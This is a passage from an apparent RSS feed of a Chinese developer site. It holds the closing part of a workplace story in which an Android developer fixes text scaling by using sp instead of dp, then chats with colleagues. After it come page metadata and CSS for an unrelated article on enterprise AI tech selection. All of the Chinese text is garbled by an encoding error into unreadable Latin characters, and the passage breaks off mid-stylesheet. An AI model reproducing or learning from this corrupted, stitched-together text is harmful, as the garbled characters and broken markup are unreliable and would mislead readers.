<p>æ—å“ç«‹åˆ»æ‰“å¼€æµ‹è¯•ç¯å¢ƒå¤ç°åœºæ™¯ï¼Œå°†ç³»ç»Ÿå­—ä½“ç¼©æ”¾å€ç‡è°ƒè‡³ 150% åï¼Œçº¯æ–‡å­—å¡ç‰‡çš„æ ‡é¢˜æ–‡æœ¬æœç„¶æ¯«æ— å˜åŒ–ï¼Œæ²¡æœ‰è·Ÿéšç¼©æ”¾å˜å¤§ã€‚</p>
<p>ä»–å¿«é€Ÿæ’æŸ¥ä»£ç ï¼Œå¾ˆå¿«é”å®šé—®é¢˜æ ¹æºï¼šåŸæœ‰æ–‡æœ¬å¤§å°è¯¯ç”¨äº† <code>dp</code> å•ä½ï¼Œå†…è¾¹è·å’Œå¡ç‰‡å®½åº¦è¿˜æ··æ‚äº† <code>px</code> å•ä½ï¼Œå°ºå¯¸å•ä½ä½¿ç”¨æä¸è§„èŒƒï¼Œå¯¼è‡´å‡ºç°è¯¥ Bugã€‚</p>
<p>â€œå…³é”®é—®é¢˜å°±åœ¨å•ä½ä¸Šã€‚â€æ—å“å¯¹ç€ä»£ç å–ƒå–ƒè‡ªè¯­ï¼Œç†æ¸…æ ¸å¿ƒé€»è¾‘ï¼Œâ€œ<code>dp</code> æ˜¯å¯†åº¦æ— å…³åƒç´ ï¼Œåªèƒ½é€‚é…ä¸åŒå±å¹•å¯†åº¦ï¼Œç¡®ä¿ç»„ä»¶åœ¨ä¸åŒè®¾å¤‡ä¸Šå°ºå¯¸ä¸€è‡´ï¼Œä½†å®Œå…¨ä¸å“åº”ç³»ç»Ÿå­—ä½“ç¼©æ”¾å€ç‡â€”â€”ä¸ç®¡ç”¨æˆ·æŠŠå­—ä½“è°ƒå¤§è¿˜æ˜¯è°ƒå°ï¼Œç”¨ <code>dp</code> è®¾ç½®çš„æ–‡æœ¬éƒ½ä¸ä¼šæœ‰ä»»ä½•å˜åŒ–ï¼Œè¿™ä¸ç¬¦åˆå¯è®¿é—®æ€§éœ€æ±‚ã€‚â€</p>
<p>â€œè€Œ <code>sp</code> å•ä½æ‰æ˜¯æ–‡æœ¬çš„æ ‡å‡†å•ä½ï¼Œå®ƒä¸ä»…èƒ½åƒ <code>dp</code> ä¸€æ ·é€‚é…å±å¹•å¯†åº¦ï¼Œæ›´æ ¸å¿ƒçš„æ˜¯ä¼šç²¾å‡†è·Ÿéšç³»ç»Ÿå­—ä½“ç¼©æ”¾å€ç‡å˜åŒ–ï¼Œç”¨æˆ·è°ƒæ•´å­—ä½“å¤§å°åï¼Œæ–‡æœ¬èƒ½åŒæ­¥ç¼©æ”¾ï¼Œè¿™ä¹Ÿæ˜¯è§£å†³å½“å‰é—®é¢˜çš„å…³é”®ã€‚æ—å“å½“å³ç€æ‰‹ä¼˜åŒ–ï¼Œå…ˆå°†æ‰€æœ‰æ–‡æœ¬å¤§å°ä» <code>dp</code> ç»Ÿä¸€æ”¹ä¸º <code>sp</code>ï¼Œè®©æ–‡æœ¬èƒ½å¤Ÿå“åº”ç³»ç»Ÿå­—ä½“ç¼©æ”¾è®¾ç½®ã€‚â€</p>
<p>ä»–è¿˜ç»™ <code>TextView</code> è¡¥å……å¸ƒå±€çº¦æŸï¼šè®¾ç½® <code>maxLines="2"</code> å’Œ <code>ellipsize="end"</code>ï¼Œç¡®ä¿æ–‡æœ¬è·Ÿéšç³»ç»Ÿç¼©æ”¾åè¿‡é•¿æ—¶ï¼Œèƒ½ä»¥çœç•¥å·ä¼˜é›…æˆªæ–­ã€‚</p>
<p>åŒæ—¶å°†å¡ç‰‡æ ¹å¸ƒå±€å®½åº¦è®¾ä¸º <code>match_parent</code>ï¼Œå†…è¾¹è·ã€é—´è·å…¨éƒ¨æ”¹ä¸º <code>dp</code> å•ä½ï¼Œé¿å…å› å•ä½æ··æ‚å¯¼è‡´å¸ƒå±€é”™ä¹±ï¼Œç¡®ä¿å­—ä½“æ”¾å¤§åï¼Œå¡ç‰‡èƒ½è‡ªé€‚åº”æ–‡æœ¬é«˜åº¦ï¼Œå½»åº•è§£å†³æº¢å‡ºé—®é¢˜ã€‚</p>
<p>ä¼˜åŒ–åæ—å“å†æ¬¡æµ‹è¯•ï¼Œå°†ç³»ç»Ÿå­—ä½“ç¼©æ”¾å€ç‡åˆ†åˆ«è°ƒè‡³ 125%ã€150%ã€175%ï¼Œçº¯æ–‡å­—å¡ç‰‡çš„æ–‡æœ¬å‡èƒ½åŒæ­¥ç¼©æ”¾ï¼Œä¸”æ— ä»»ä½•æº¢å‡ºï¼Œå¸ƒå±€ä¿æŒè§„æ•´ã€‚</p>
<p>ä¸ºäº†è§„é¿å›¢é˜Ÿåç»­å†å‡ºç°ç±»ä¼¼é—®é¢˜ï¼Œæ—å“æ‰“å¼€å›¢é˜Ÿå…±äº«çš„å¼€å‘è§„èŒƒæ–‡æ¡£ï¼Œç‰¹æ„æ–°å¢å¹¶å¼ºåŒ–äº†ä¸€æ¡å°ºå¯¸å•ä½ä½¿ç”¨å‡†åˆ™ï¼šå¸ƒå±€ç»„ä»¶å¤§å°ã€è¾¹è·ã€é—´è·ç»Ÿä¸€ç”¨ <code>dp</code>ï¼Œä¿è¯å¤šè®¾å¤‡å°ºå¯¸ä¸€è‡´æ€§ï¼›æ–‡æœ¬å¤§å°å¿…é¡»ç”¨ <code>sp</code>ï¼Œå¼ºåˆ¶å“åº”ç³»ç»Ÿå­—ä½“ç¼©æ”¾è®¾ç½®ï¼Œæ»¡è¶³ä¸åŒç”¨æˆ·çš„é˜…è¯»éœ€æ±‚ï¼›ç‰¹æ®Šåœºæ™¯ï¼ˆå¦‚è‡ªå®šä¹‰ <code>View</code> ç»˜å›¾ï¼‰éœ€å°† <code>dp</code> è½¬ä¸º <code>px</code> è®¡ç®—ï¼Œé€šè¿‡ <code>Resources.getSystem().getDisplayMetrics().density</code> è·å–å¯†åº¦ç³»æ•°ï¼Œä¸¥ç¦ç¡¬ç¼–ç æˆ–æ··ç”¨å•ä½ã€‚</p>
<p>ä»–è¡¥å……å®Œè§„èŒƒåï¼Œåˆé¡ºæ‰‹æ•´ç†äº† <code>dp</code>ã€<code>sp</code> ä¸ <code>px</code> çš„æ ¸å¿ƒåŒºåˆ«å¤‡æ³¨åœ¨æ—ï¼Œæ–¹ä¾¿å›¢é˜Ÿæ–°äººå¿«é€Ÿç†è§£ï¼š<code>px</code> æ˜¯å›ºå®šåƒç´ å•ä½ï¼Œè·¨è®¾å¤‡æ˜¾ç¤ºå·®å¼‚å¤§ï¼Œç¦æ­¢ç”¨äºå¸ƒå±€ï¼›<code>dp</code> é€‚é…å±å¹•å¯†åº¦ï¼Œé€‚åˆå¸ƒå±€å±æ€§ï¼›<code>sp</code> åœ¨ <code>dp</code> åŸºç¡€ä¸Šå…¼å®¹å­—ä½“ç¼©æ”¾ï¼Œä¸“ä¸ºæ–‡æœ¬è®¾è®¡ã€‚</p>
<p>æ—å“é•¿èˆ’ä¸€å£æ°”ï¼Œç»ˆäºæŠŠä»Šå¤©æ‰€æœ‰çš„ä¼˜åŒ–ä»»åŠ¡å’Œ Bug ä¿®å¤éƒ½æ”¶å°¾äº†ã€‚ä»–æŠ¬æ‰‹æ‰äº†æ‰é…¸èƒ€çš„çœ¼ç›ï¼Œç¥äº†çœ¼ç”µè„‘å³ä¸‹è§’çš„æ—¶é—´â€”â€”æ™šä¸Šå…«ç‚¹åŠã€‚ç´§ç»·äº†ä¸€å¤©çš„ç¥ç»éª¤ç„¶æ”¾æ¾ï¼Œä»–æ‰æƒ³èµ·è¿˜æ²¡é—®å°å®‰æ”¯æ´çš„äº‹ï¼Œèµ¶ç´§ç‚¹å¼€Qä¹¦èŠå¤©æ¡†ï¼Œæ•²ä¸‹ä¸€è¡Œå­—ï¼šâ€œå°å®‰ï¼Œä½ æ˜¯ä¸æ˜¯æ¥æ”¯æ´è½¦è½½é¡¹ç›®äº†ï¼Ÿæ€ä¹ˆéƒ½æ˜¯ä½ æçš„ Bug å‘€â€ï¼Œç‚¹å‡»å‘é€åä¾¿é™é™ç­‰ç€å›å¤ã€‚</p>
<p>æ¶ˆæ¯åˆšå‘å‡ºå»ï¼Œä¸€é“å¸¦ç€åŸ‹æ€¨çš„å£°éŸ³å°±ä»èº«åä¼ æ¥ï¼šâ€œè¿˜é—®å‘¢ï¼Œå¯ä¸å°±æ˜¯æ¥æ”¯æ´äº†ï¼Œå¤šäºäº†ä½ è¿™ä½â€˜ä¼˜åŒ–å¤§ç¥â€™ï¼Œæˆ‘ä¹Ÿå¾—é™ªç€ä½ åŠ ç­åˆ°è¿™ä¼šå„¿ã€‚â€</p>
<p>æ—å“æµ‘èº«ä¸€åƒµï¼Œéšå³çŒ›åœ°å›å¤´ï¼Œåªè§å°å®‰ç«™åœ¨èº«åï¼Œå¹³æ—¥é‡Œç²¾ç¥åˆ©è½çš„é«˜é©¬å°¾å› ç†¬äº†åŠå¤©åŠ ç­ï¼Œæ—©å·²æ¾æ¾å®å®åœ°å‚æˆäº†ä½é©¬å°¾ï¼Œå‘å°¾å¾®å¾®å‡Œä¹±ï¼Œçœ‰å¤´è½»è¹™å´éš¾æ©çœ¼åº•ç¬‘æ„ï¼Œè¯­æ°”é‡Œçš„åŸ‹æ€¨æ›´åƒæ˜¯å¸¦ç€å‡ åˆ†ç–²æƒ«çš„æ’’å¨‡ã€‚</p>
<p>çœ‹æ¸…æ¥äººï¼Œæ—å“ç¬é—´å–œå‡ºæœ›å¤–ï¼Œè¿æ—¥æ¥åŠ ç­çš„ç–²æƒ«ä¸€æ‰«è€Œç©ºï¼Œæ¿€åŠ¨å¾—å·®ç‚¹ä»æ¤…å­ä¸Šè·³èµ·æ¥ï¼Œæ‰‹èˆè¶³è¹ˆåœ°è¯´é“ï¼šâ€œå¤ªå¥½äº†ï¼Œå’³å’³ï¼Œæœ‰ä½ æµ‹è¯•ï¼Œæˆ‘å°±æ”¾å¿ƒå¤šäº†ã€‚â€ä»–åªé¡¾ç€å’Œå°å®‰è¯´è¯ï¼Œå®Œå…¨æ²¡ç•™æ„å‘¨å›´çš„åŠ¨é™ã€‚</p>
<p>å°å®‰å¿ç€ç¬‘ï¼Œç”¨ä¸‹å·´æŒ‡äº†æŒ‡ä»–å‰æ–¹ï¼šâ€œåœï¼Œåœï¼Œä½ çœ‹çœ‹å‰é¢æ˜¯è°ã€‚â€æ—å“ç–‘æƒ‘åœ°é¡ºç€å¥¹æŒ‡çš„æ–¹å‘çœ‹å»ï¼Œåªè§è€æ¨ç«¯ç€é‚£åªæ ‡å¿—æ€§çš„æªç“·æ¯ï¼Œæ…¢æ‚ æ‚ åœ°ç«™åœ¨å·¥ä½è¿‡é“ä¸Šï¼Œæ¯æ²¿è¿˜å†’ç€æ·¡æ·¡çš„çƒ­æ°”ï¼Œè„¸ä¸Šå¸¦ç€æ¸©å’Œçš„ç¬‘æ„ï¼Œæ­£ä¼¼ç¬‘éç¬‘åœ°çœ‹ç€ä»–ã€‚</p>
<p>æ—å“ç«‹åˆ»æ”¶æ•›äº†é›€è·ƒçš„åŠ¨ä½œï¼Œç«™èµ·èº«æŒ äº†æŒ å¤´ï¼Œæœ‰äº›ä¸å¥½æ„æ€åœ°æ‰“æ‹›å‘¼ï¼šâ€œè€æ¨ï¼Œæ€ä¹ˆï¼Œä½ ä¹Ÿæ¥äº†ï¼Ÿâ€è€æ¨ç¬‘ç€æŠ¿äº†å£èŒ¶ï¼Œæ™ƒäº†æ™ƒæ‰‹é‡Œçš„æªç“·æ¯ï¼šâ€œå¬è¯´æˆ‘ä»¬å°æ—ä»Šå¤©å•ƒä¸‹äº†æ–°é—»æ¨¡å—çš„ç¡¬éª¨å¤´ï¼Œè¿‡æ¥çœ‹çœ‹ã€‚é¡ºä¾¿ï¼Œä¹Ÿæ¥ä½ ä»¬ä¿©åƒä¸ªå¤œå®µã€‚â€</p>
<p>......</p>
<p>ä¸‰å¤©åï¼Œæ–°é—»æ¨¡å—è¿æ¥äº†æœ€ç»ˆéªŒæ”¶æµ‹è¯•ã€‚æµ‹è¯•å›¢é˜Ÿå›´ç»•å…¨åœºæ™¯é€é¡¹æ ¸éªŒï¼Œå°å®‰å¸¦ç€æµ‹è¯•ç”¨ä¾‹é€ä¸€æ’æŸ¥ï¼Œæ‰€æœ‰ä¼˜åŒ–ç‚¹å‡è¾¾æ ‡ï¼Œæ— æ–°å¢ Bugã€‚</p>
<p>â€œå®Œç¾é€šè¿‡ï¼â€å°å®‰æ‹¿ç€æµ‹è¯•æŠ¥å‘Šèµ°åˆ°æ—å“å·¥ä½ï¼Œæ¾äº†å£æ°”ç¬‘é“ï¼Œâ€œä½ è¿™æ³¢å¤ªç¨³äº†ï¼Œå“ˆå“ˆï¼â€</p>
<p>æ—å“çœ‹ç€æŠ¥å‘Šä¸Šçš„â€œå…¨éƒ¨é€šè¿‡â€ï¼Œè¿æ—¥åŠ ç­çš„ç–²æƒ«å½»åº•æ¶ˆæ•£ï¼Œæ­£æƒ³å¼€å£ï¼Œå°±è§å¼ ç£Šå¸¦ç€è€æ¨èµ°äº†è¿‡æ¥ï¼Œè„¸ä¸Šæ»¡æ˜¯å–œè‰²ã€‚</p>
<p>â€œå°æ—ï¼Œè¿™æ¬¡æ–°é—»æ¨¡å—ä¼˜åŒ–åšå¾—æ¼‚äº®ï¼Œå®¢æˆ·é‚£è¾¹çœ‹äº†æ¼”ç¤ºè§†é¢‘ï¼Œç‰¹æ„å‘æ¶ˆæ¯è¡¨æ‰¬äº†æˆ‘ä»¬å›¢é˜Ÿã€‚â€å¼ ç£Šæ‹äº†æ‹æ—å“çš„è‚©è†€ï¼Œåˆä¾§èº«æŒ‡äº†æŒ‡è€æ¨ï¼Œâ€œå¯¹äº†ï¼Œè·Ÿä½ è¯´ä¸ªäº‹ï¼Œè€æ¨è¿™æ¬¡ä¹Ÿæ¥æ”¯æ´è½¦è½½é¡¹ç›®äº†ï¼Œåªä¸è¿‡æ²¡è·Ÿæˆ‘ä»¬ä¸€èµ·è´Ÿè´£ UI æ¨¡å—ã€‚â€</p>
<p>æ—å“ä¸€æ„£ï¼Œéšå³çœ‹å‘è€æ¨ï¼Œçœ¼é‡Œæ»¡æ˜¯ç–‘æƒ‘ï¼šâ€œè€æ¨ï¼Œæ‚¨ä¹Ÿæ¥æ”¯æ´äº†ï¼Ÿæˆ‘è¿˜ä»¥ä¸ºæ‚¨åªæ˜¯è¿‡æ¥çœ‹çœ‹æˆ‘ä»¬ã€‚â€</p>
<p>è€æ¨ç¬‘ç€æ™ƒäº†æ™ƒæ‰‹é‡Œçš„æªç“·æ¯ï¼Œæ¯æ²¿çš„çƒ­æ°”è¢…è¢…å‡èµ·ï¼Œè¯­æ°”æ¸©å’Œå´å¸¦ç€ä¸“ä¸šæ„Ÿï¼šâ€œæ˜¯å•Šï¼Œè¿‡æ¥æ”¯æ´ä¸€ä¸‹ï¼Œä¸»è¦è´Ÿè´£å¤§æ¨¡å‹åº•å±‚æ®µæ¨¡å‹çš„é›†æˆä¸ä¼˜åŒ–ï¼Œè·Ÿä½ ä»¬ UI æ¨¡å—å±äºå¹¶è¡Œæ¨è¿›ï¼Œæ²¡ç‰¹æ„æ‰“æ‰°ä½ ä»¬èµ¶è¿›åº¦ã€‚â€</p>
<p>ä»–é¡¿äº†é¡¿ï¼Œè¡¥å……é“ï¼šâ€œè½¦è½½å¤§æ¨¡å‹çš„åº•å±‚æ®µæ¨¡å‹ï¼Œå…³ä¹è¯­ä¹‰ç†è§£é€Ÿåº¦å’Œèµ„æºå ç”¨ç‡ï¼Œå¾—åå¤è°ƒè¯•é€‚é…è½¦æœºç¡¬ä»¶ï¼Œç¡®ä¿åœ¨ä½åŠŸè€—ä¸‹ä¹Ÿèƒ½å¿«é€Ÿå“åº”ã€‚ä½ ä»¬ UI æ¨¡å—ä¼˜åŒ–å¥½äº†äº¤äº’ä½“éªŒï¼Œæˆ‘è¿™è¾¹æŠŠåº•å±‚æ¨¡å‹æ‰“ç£¨ç¨³å®šï¼Œä¸¤è€…é…åˆæ‰èƒ½ç»™å®¢æˆ·å‘ˆç°æœ€ä¼˜çš„æ•´ä½“æ•ˆæœã€‚â€</p>
<p>æ—å“æç„¶å¤§æ‚Ÿï¼Œå¿ƒé‡Œæ»¡æ˜¯æ•¬ä½©ï¼šâ€œåŸæ¥æ˜¯è¿™æ ·ï¼Œæˆ‘è¯´æ‚¨é‚£å¤©æ™šä¸Šè¿‡æ¥ï¼Œä¸å…‰æ˜¯æ¥æˆ‘ä»¬åƒå¤œå®µï¼Œä¹Ÿæ˜¯åœ¨ç›¯ç€æˆ‘è·Ÿè¿›é¡¹ç›®è¿›åº¦ã€‚éš¾æ€ªè¿™å‡ å¤©æ„Ÿè§‰ç³»ç»Ÿæ•´ä½“å“åº”å¿«äº†ä¸å°‘ï¼ŒåŸæ¥æ˜¯æ‚¨åœ¨åº•å±‚åšäº†ä¼˜åŒ–ã€‚â€</p>
<p>â€œäº’ç›¸é…åˆç½¢äº†ã€‚â€è€æ¨æ‘†äº†æ‘†æ‰‹ï¼Œç›®å…‰è½åœ¨æ—å“çš„ç”µè„‘å±å¹•ä¸Šï¼Œçœ‹ç€ä¼˜åŒ–åçš„æ–°é—»æ¨¡å—ï¼Œèµè®¸åœ°ç‚¹ç‚¹å¤´ï¼Œâ€œä½ è¿™æ¬¡æŠŠ <code>RecyclerView</code>ã€ç»„ä»¶é€‰å‹è¿™äº›åŸºç¡€æŠ€æœ¯ç”¨å¾—å¾ˆæ‰å®ï¼Œå°¤å…¶æ˜¯æ ¹æ®åœºæ™¯çµæ´»åˆ‡æ¢ <code>SurfaceView</code> å’Œ <code>TextureView</code>ï¼Œè¿˜è¡¥å……äº†å¼€å‘è§„èŒƒï¼Œçœ‹å¾—å‡ºæ¥æ˜¯çœŸçš„åƒé€äº†ï¼Œæˆé•¿å¾ˆå¿«ã€‚â€</p>
<p>å¼ ç£Šæ¥è¿‡è¯èŒ¬ï¼Œç¿»çœ‹ç€æµ‹è¯•æŠ¥å‘Šï¼Œè¯­æ°”é‡Œæ»¡æ˜¯è‡ªè±ªï¼šâ€œæ¯ä¸ªæŠ€æœ¯ç‚¹éƒ½ç”¨åœ¨äº†åˆ€åˆƒä¸Šï¼Œå®Œå…¨è§£å†³äº†è½¦è½½åœºæ™¯çš„ç—›ç‚¹ã€‚ç°åœ¨ UI æ¨¡å—å’Œåº•å±‚æ¨¡å‹éƒ½ç¨³æ­¥æ¨è¿›ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„è¿­ä»£ç®—æ˜¯ç¨³äº†ã€‚â€</p>
<p>æ—å“ç¬‘ç€æŒ äº†æŒ å¤´ï¼Œè¯­æ°”è¯šæ³ï¼šâ€œéƒ½æ˜¯è·Ÿç€æ‚¨çš„ç¬”è®°å­¦çš„ï¼Œå†åŠ ä¸Šå°å®‰æµ‹è¯•æ—¶å¸®æˆ‘æªå‡ºä¸å°‘ç»†èŠ‚é—®é¢˜ã€‚å…¶å®è¿™äº›æŠ€æœ¯çœ‹ä¼¼åŸºç¡€ï¼Œåªæœ‰çœŸæ­£åœ¨é¡¹ç›®ä¸­é‡åˆ°é—®é¢˜ã€åŠ¨æ‰‹ä¼˜åŒ–ï¼Œæ‰èƒ½çœŸæ­£æŒæ¡ï¼Œè¿˜å¾—æ„Ÿè°¢æ‚¨å’Œå°å®‰çš„å¸®è¡¬ã€‚â€</p>
<p>å°å®‰åœ¨ä¸€æ—æ‰“è¶£é“ï¼šâ€œåˆ«è°¢æˆ‘ï¼Œæˆ‘åªæ˜¯åšå¥½æœ¬èŒå·¥ä½œï¼Œå€’æ˜¯ä½ è¿™ä½â€˜å¤§ç¥â€™ï¼Œå¥½å¥½åŠ æ²¹ï¼Œçœå¾—å¤©å¤©é™ªä½ åŠ ç­æ‰¾ Bugã€‚â€ä¸€å¥è¯é€—å¾—ä¼—äººéƒ½ç¬‘äº†èµ·æ¥ï¼Œè¿æ—¥åŠ ç­çš„ç´§ç»·æ°›å›´å½»åº•å˜å¾—è½»æ¾ã€‚</p>
<p>......</p>
<p>æ·±å¤œçš„åŠå…¬åŒºï¼Œåªå‰©é›¶æ˜Ÿå‡ ç›ç¯è¿˜äº®ç€ã€‚æ—å“çœ‹ç€å±å¹•ä¸Šæµç•…è¿è¡Œçš„ç•Œé¢ï¼ŒæŒ‡å°–åˆ’è¿‡ä»£ç ä¸­ç†Ÿæ‚‰çš„æŠ€æœ¯å®ç°ï¼Œå¿ƒé‡Œæ»¡æ˜¯è¸å®ã€‚è½¦æœºå±å¹•ä¸Šï¼Œæ–°é—»å¡ç‰‡æœ‰åºæ’åˆ—ï¼Œè§†é¢‘é¢„è§ˆæµç•…æ’­æ”¾ï¼Œæ–‡æœ¬æ˜¾ç¤ºæ¸…æ™°è§„æ•´ï¼Œæ¯ä¸€å¤„ç»†èŠ‚éƒ½å‡èšç€ä»–å¯¹æŠ€æœ¯çš„æ•¬ç•ä¸æ‰“ç£¨ã€‚</p>
<p>çª—å¤–çš„æœˆå…‰æ´’åœ¨é”®ç›˜ä¸Šï¼Œç…§äº®äº†ä»–æ¥ä¸‹æ¥çš„è®¡åˆ’â€”â€”æŠŠè¿™æ¬¡ä¼˜åŒ–çš„ç»éªŒæ•´ç†æˆç¬”è®°ï¼Œå°±åƒè€æ¨é‚£æ ·ï¼Œä¸ºå›¢é˜Ÿæ²‰æ·€æœ‰ä»·å€¼çš„æŠ€æœ¯èµ„äº§ï¼Œä¹Ÿä¸ºè‡ªå·±çš„æˆé•¿ç•™ä¸‹æ¸…æ™°çš„å°è®°ã€‚</p>
<p>æ—å“å…³æ‰ä»£ç ç¼–è¾‘å™¨ï¼Œé¡ºæ‰‹ç‚¹å¼€Qä¹¦ï¼Œç½®é¡¶ä½ç½®ä¸¤ä¸ªå¤´åƒï¼Œä¸€ä¸ªæ˜¯è€æ¨çš„æªç“·æ¯ä¸“å±å¤´åƒï¼Œä¸€ä¸ªæ˜¯å°å®‰ç¬‘çœ¼å¼¯å¼¯çš„è‡ªæ‹å¤´åƒã€‚ä»–æ„£äº†æ„£ï¼Œéšå³å˜´è§’æ‰¬èµ·ä¸€æŠ¹æ¸©å’Œçš„ç¬‘æ„ã€‚</p>
<p>èº«è¾¹æœ‰ç»éªŒä¸°å¯Œçš„è€æ¨åœ¨åº•å±‚å…œåº•æ”¯æ’‘ï¼Œæœ‰ç»†è‡´çš„å°å®‰å¸®ç€æŠŠæ§æµ‹è¯•ç»†èŠ‚ï¼Œè¿™ä»½æ›¾è®©ä»–å€æ„Ÿå‹åŠ›çš„è½¦è½½å¼€å‘å·¥ä½œï¼Œä¸çŸ¥ä¸è§‰é—´ç«Ÿå˜å¾—è½»æ¾æƒ¬æ„èµ·æ¥ã€‚</p>
<p>ä»–å…³æ‰ç”µè„‘ï¼Œèµ·èº«èµ°å‘å°å®‰ï¼Œè¯¢é—®æ˜¯å¦ä¸‹ç­ï¼Œè¿æ—¥åŠ ç­çš„ç–²æƒ«æ—©å·²è¢«è¿™ä»½è¸å®ä¸æš–æ„å†²æ·¡ï¼Œè„šæ­¥éƒ½å˜å¾—è½»å¿«äº†è®¸å¤šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 å¹´ä¼ä¸šçº§ AI åº”ç”¨æŠ€æœ¯é€‰å‹çœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº†!]]></title>    <link>https://juejin.cn/post/7596845113282035721</link>    <guid>https://juejin.cn/post/7596845113282035721</guid>    <pubDate>2026-01-20T00:47:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596845113282035721" data-draft-id="7596906473306718258" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 å¹´ä¼ä¸šçº§ AI åº”ç”¨æŠ€æœ¯é€‰å‹çœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº†!"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIç¼–ç¨‹,Cursor"/> <meta itemprop="datePublished" content="2026-01-20T00:47:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹˜é£gg"/> <meta itemprop="url" content="https://juejin.cn/user/4248168658899741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 å¹´ä¼ä¸šçº§ AI åº”ç”¨æŠ€æœ¯é€‰å‹çœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº†!
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4248168658899741/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹˜é£gg
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:47:30.000Z" title="Tue Jan 20 2026 00:47:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul 